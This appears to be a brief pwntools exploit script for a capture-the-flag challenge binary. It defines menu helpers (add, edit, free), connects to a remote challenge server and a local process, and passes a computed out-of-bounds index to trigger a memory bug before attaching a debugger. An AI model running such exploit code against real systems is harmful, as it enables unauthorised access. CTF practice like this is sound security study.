from pwn import*
def add(idx):
    p.sendlineafter('choice?','1')
    p.sendlineafter('idx?\n',str(idx))
def edit(idx,content): #Just Once
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(content)
def free(idx):
    p.sendline('3')
    p.sendline(str(idx))
p = remote('123.56.85.29',4205)
p = process('./pwn')
ptr = 0x4040C0
list = 0x4040E0
offset = (ptr-list)/8
gdb.attach(p)
add(offset)
p.sendline('6')
p.interactive()
